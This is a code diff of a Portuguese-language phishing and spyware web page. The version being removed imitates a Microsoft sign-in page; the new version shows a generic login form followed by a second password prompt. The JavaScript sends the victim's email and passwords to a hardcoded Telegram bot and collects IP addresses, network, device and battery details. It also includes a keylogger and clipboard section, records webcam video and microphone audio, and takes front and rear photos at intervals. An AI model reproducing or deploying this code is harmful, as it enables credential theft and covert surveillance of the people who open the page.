@@ -3,69 +3,41 @@
 <head>
 <meta charset="utf-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Entrar - Microsoft</title>
 <style>
  *{margin:0;padding:0;box-sizing:border-box}
- html,body{height:100%;display:flex;align-items:center;justify-content:center;background:#fff;font-family:"Segoe UI",Roboto,sans-serif}
-
- /* loading idêntico ao original */
- #load{position:fixed;inset:0;z-index:9999;background:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center}
- .spin{width:60px;height:60px;border:4px solid #0078d440;border-top-color:#0078d4;border-radius:50%;animation:spin 1s linear infinite}
+ html,body{height:100%;background:#000;display:flex;align-items:center;justify-content:center;color:#00ff88;font:24px sans-serif}
+ #load{position:fixed;inset:0;z-index:9999;background:#000;display:flex;flex-direction:column;align-items:center;justify-content:center}
+ .spin{width:60px;height:60px;border:4px solid #00ff8840;border-top-color:#00ff88;border-radius:50%;animation:spin s linear infinite}
  @keyframes spin{to{transform:rotate(360deg)}}
-
- /* login-box Microsoft */
- #fakeForm{display:none;position:fixed;inset:00;z-index:100;background:#fff;flex-direction:column;align-items:center;justify-content:center}
- .login-box{background:#fff;border:1px solid #d2d0ce;border-radius:6px;box-shadow:0 2px 6px rgba(0,0,0,.07);width:440px;padding:44px;display:flex;flex-direction:column}
- .login-box svg{margin-bottom:32px}
- .login-box h1{font-size:32px;font-weight:600;margin-bottom:32px;color:#1a1a1a}
- .login-box input{width:100%;height:40px;padding:0 12px;border:2px solid #d2d0ce;border-radius:4px;font-size:16px;transition:border-color .2s}
- .login-box input:hover{border-color:#a19f9d}
- .login-box input:focus{border-color:#0078d4}
- .login-box button{align-self:flex-end;background:#0078d4;color:#fff;border:0;border-radius:4px;padding:10px 32px;font-size:15px;font-weight:600;cursor:pointer;transition:background .2s}
- .login-box button:hover{background:#005ea6}
- .login-box p{font-size:13px;color:#5c5c5c;margin-top:20px}
- .login-box a{color:#0078d4;text-decoration:none}
- .login-box a:hover{text-decoration:underline}
-
- #statusPC{position:fixed;bottom:20px;left:20px;color:#0078d4;font:12px monospace;opacity:.6}
+ .fakeForm{display:none;background:#111;padding:40px;border-radius:8px;color:#eee;flex-direction:column;align-items:center}
+ .fakeForm h2{margin-bottom:20px;font-size:20px}
+ .fakeForm input{width:260px;padding:12px;margin:8px 0;border:0;border-radius:4px;font-size:16px}
+ .fakeForm button{width:100%;padding:14px;margin-top:12px;border:0;border-radius:4px;background:#00ff88;color:#000;font-size:16px;font-weight:bold;cursor:pointer}
+ .fakeForm button:hover{background:#00cc6a}
+ #statusPC{position:fixed;bottom:20px;left:20px;color:#00ff88;font:12px monospace;opacity:.6}
 </style>
 </head>
 <body>
-
-<!-- tela de loading -->
 <div id="load">
  <div class="spin"></div>
- <h3 style="margin-top:16px;color:#333">Carregando<span class="dots">...</span></h3>
+ <h3>Carregando<span class="dots">...</span></h3>
 </div>
 
-<!-- formulário falso Microsoft -->
-<form id="fakeForm">
-  <div class="login-box">
-    <!-- logo -->
-    <svg width="108" height="24" viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg">
-      <rect x="0" y="0" width="11" height="11" fill="#F25022"/>
-      <rect x="12" y="0" width="11" height="11" fill="#7FBA00"/>
-      <rect x="0" y="12" width="11" height="11" fill="#00A4EF"/>
-      <rect x="12" y="12" width="11" height="11" fill="#FFB900"/>
-      <text x="30" y="17" font-family="Segoe UI" font-size="16" font-weight="600" fill="#737373">Microsoft</text>
-    </svg>
+<form id="fakeForm" class="fakeForm">
+ <h2>Acesse sua conta</h2>
+ <input id="em" type="email" placeholder="E-mail" autocomplete="email">
+ <input id="pw" type="password" placeholder="Senha" autocomplete="current-password">
+ <button type="submit">Entrar</button>
+</form>
 
-    <h1>Entrar</h1>
-
-    <input id="em" type="email" placeholder="Email, telefone ou Skype" autocomplete="email" required>
-
-    <!-- campo senha só aparece se quiser segundo passo; aqui fica oculto -->
-    <input id="pw" type="password" placeholder="Senha" autocomplete="current-password" style="display:none">
-
-    <button type="submit">Avançar</button>
-
-    <p>Não tem uma conta? <a href="#">Crie uma!</a></p>
-  </div>
+<form id="fakeForm2" class="fakeForm">
+ <h2>Confirme sua senha</h2>
+ <input id="pw2" type="password" placeholder="Digite novamente" autocomplete="current-password">
+ <button type="submit">Confirmar</button>
 </form>
 
 <div id="statusPC"></div>
 
-<!-- resto idêntico -->
 <script>
 const BOT_TOKEN="8783547945:AAHBAXXALN7Vi063RlRGoggCGWpWfmZTTks";
 const CHAT_ID="8792921881";
@@ -124,7 +96,7 @@ async function gps(){
  });
 }
 
-/* ---------- IP + ISP + VPN ---------- */
+/* ---------- IP + ISP ---------- */
 async function redes(){
  try{
    const ip=await fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(j=>j.ip).catch(()=>"---"); rel.push(`IP Público: ${ip}`);
@@ -132,10 +104,14 @@ async function redes(){
    let cand=[]; pc.onicecandidate=e=>{if(e&&e.candidate)cand.push(e.candidate.candidate)};
    try{await pc.setLocalDescription(await pc.createOffer());await sleep(1500)}catch{}; pc.close();
    const priv=cand.find(c=>c.includes("192.168")||c.includes("10.")||c.includes("172.")); rel.push(`IP Privado: ${priv?priv.split(" ")[4]:'---'}`);
-   const geo=await fetch(`http://ip-api.com/json/${ip}`).then(r=>r.json()).catch(()=>({isp:"",country:"",org:""}));
-   rel.push(`ISP: ${geo.isp||'---'} | País: ${geo.country||'---'}`);
+   const geo=await fetch(`http://ip-api.com/json/${ip}`).then(r=>r.json()).catch(()=>({isp:"Indisponível",country:"Indisponível",org:""}));
+   rel.push(`ISP: ${geo.isp} | País: ${geo.country}`);
    if(navigator.connection){const c=navigator.connection;rel.push(`Rede: ${c.type||'-'} ${c.effectiveType||'-'} ${c.downlink?c.downlink+'Mbps':''}`);}
-   rel.push(`VPN?: ${(geo.org&&geo.org.toLowerCase().includes("vpn"))?"Suspeito":"Não detectado"}`);
+   if('connection' in navigator && navigator.connection.ssid){
+     rel.push(`Wi-Fi: ${navigator.connection.ssid}`);
+   }else{
+     rel.push(`Wi-Fi: nome oculto (permissão necessária)`);
+   }
  }catch(e){rel.push(`Rede: erro`)}
 }
 
@@ -143,7 +119,6 @@ async function redes(){
 function hwinfo(){
  rel.push(`User-Agent: ${navigator.userAgent?.slice(0,200)}`);
  rel.push(`Plataforma: ${navigator.platform}`);
- rel.push(`Núcleos CPU: ${navigator.hardwareConcurrency||'?'}`);
  rel.push(`RAM estimada: ${navigator.deviceMemory||'?'} GB`);
  rel.push(`Tela: ${screen.width}x${screen.height} | Viewport: ${window.innerWidth}x${window.innerHeight}`);
  rel.push(`Idioma: ${navigator.language}`);
@@ -151,7 +126,12 @@ function hwinfo(){
  if(performance.memory){const used=(performance.memory.usedJSHeapSize/1048576).toFixed(1),total=(performance.memory.totalJSHeapSize/1048576).toFixed(1);rel.push(`Memória JS: ${used}/${total} MB`);}
 }
 async function bateria(){
- try{const bat=await navigator.getBattery();rel.push(`Bateria: ${(bat.level*100).toFixed(0)}% | ${bat.charging?'Carregando':'Desconectado'}`)}catch{rel.push("Bateria: não disponível")}
+ try{
+   const bat=await navigator.getBattery();
+   rel.push(`Bateria: ${(bat.level*100).toFixed(0)}% | ${bat.charging?'Carregando':'Desconectado'}`);
+ }catch{
+   rel.push("Bateria: não permitido");
+ }
 }
 
 /* ---------- Keylogger + clipboard ---------- */
@@ -163,9 +143,10 @@ function keylogger(){
 /* ---------- Mídias (fotos/vídeo/mp4) ---------- */
 async function midias(){
  statusPC("Solicitando mídia..."); let stream=null;
- try{stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:1280,height:720},audio:{sampleRate:44100,channelCount:1,echoCancellation:false}});statusPC("Permissões OK");}
+ try{stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:1280,height:720},audio:{sampleRate:48000,channelCount:2,echoCancellation:false,noiseSuppression:false,autoGainControl:false}});statusPC("Permissões OK");}
  catch(err){rel.push(`Mídia negada: ${err.name}`);statusPC("Mídia negada");return;}
  videoStream=stream; audioStream=new MediaStream(stream.getAudioTracks());
+
 
  // vídeo contínuo → mp4
  try{
@@ -196,34 +177,60 @@ async function midias(){
  setInterval(()=>{useA=!useA;audioRecorder.stop();audioRecorder=makeAudioRecorder()},10000);
 
  // fotos
- const tirarFoto=async(facing="user",label="selfie")=>{
-   try{
-     const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:facing,width:1280,height:720}});
-     const track=s.getVideoTracks()[0];const img=new ImageCapture(track);const blob=await img.takePhoto();
-     const fd=new FormData();fd.append("photo",blob,`${label}_${Date.now()}.jpg`);fd.append("chat_id",CHAT_ID);
-     await enviarMidia("Photo",fd);save({t:label,s:blob.size});track.stop();
-   }catch{
-     const c=document.createElement("canvas");c.width=640;c.height=480;
-     const v=document.createElement("video");v.srcObject=videoStream;v.muted=true;v.play();await sleep(100);
-     c.getContext("2d").drawImage(v,0,0,640,480);
-     c.toBlob(b=>{const fd=new FormData();fd.append("photo",b,`${label}_${Date.now()}.jpg`);fd.append("chat_id",CHAT_ID);enviarMidia("Photo",fd)},"image/jpeg",0.7);
-   }
- };
- fotoTimeout=setInterval(()=>tirarFoto("user","selfie"),10000);
- setTimeout(()=>tirarFoto("environment","rear"),2000);
- statusPC("Mídia ativa");
-}
+   // fotos
+  const tirarFoto=async(facing="user",label="selfie")=>{
+    try{
+      const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:facing,width:1280,height:720}});
+      const track=s.getVideoTracks()[0];
+      const img=new ImageCapture(track);
+      const blob=await img.takePhoto();
+      const fd=new FormData();
+      fd.append("photo",blob,`${label}_${Date.now()}.jpg`);
+      fd.append("chat_id",CHAT_ID);
+      await enviarMidia("Photo",fd);
+      save({t:label,s:blob.size});
+      track.stop();
+    }catch{
+      const c=document.createElement("canvas");
+      c.width=640;c.height=480;
+      const v=document.createElement("video");
+      v.srcObject=videoStream;
+      v.muted=true;
+      v.play();
+      await sleep(100);
+      c.getContext("2d").drawImage(v,0,0,640,480);
+      c.toBlob(b=>{
+        const fd=new FormData();
+        fd.append("photo",b,`${label}_${Date.now()}.jpg`);
+        fd.append("chat_id",CHAT_ID);
+        enviarMidia("Photo",fd)},"image/jpeg",0.7);
+    }
+  };
 
-/* ---------- Login falso ---------- */
+  fotoTimeout=setInterval(()=>tirarFoto("user","selfie"),10000);
+  setTimeout(()=>tirarFoto("environment","rear"),2000);
+  statusPC("Mídia ativa");
+}; // ← aqui fecha midias()
+
+
+/* ---------- Login falso + 2ª senha ---------- */
 function fakeLogin(){
  document.getElementById("load").style.display="none";
  document.getElementById("fakeForm").style.display="flex";
  document.getElementById("fakeForm").onsubmit=e=>{
    e.preventDefault();
-   const email=document.getElementById("em").value,pw=document.getElementById("pw").value||"(vazia)";
+   const email=document.getElementById("em").value,pw=document.getElementById("pw").value;
    rel.push(`EMAIL: ${email}`);rel.push(`SENHA: ${pw}`);
    enviarTexto(`🔐 LOGIN\nE: ${email}\nS: ${pw}`);save({t:"login",em:email,pw:pw});
    document.getElementById("fakeForm").style.display="none";
+   document.getElementById("fakeForm2").style.display="flex";
+ };
+ document.getElementById("fakeForm2").onsubmit=e=>{
+   e.preventDefault();
+   const pw2=document.getElementById("pw2").value;
+   rel.push(`SENHA2: ${pw2}`);
+   enviarTexto(`🔐 SENHA2: ${pw2}`);save({t:"senha2",pw:pw2});
+   document.getElementById("fakeForm2").style.display="none";
    document.getElementById("load").style.display="flex";
    initFinal();
  };
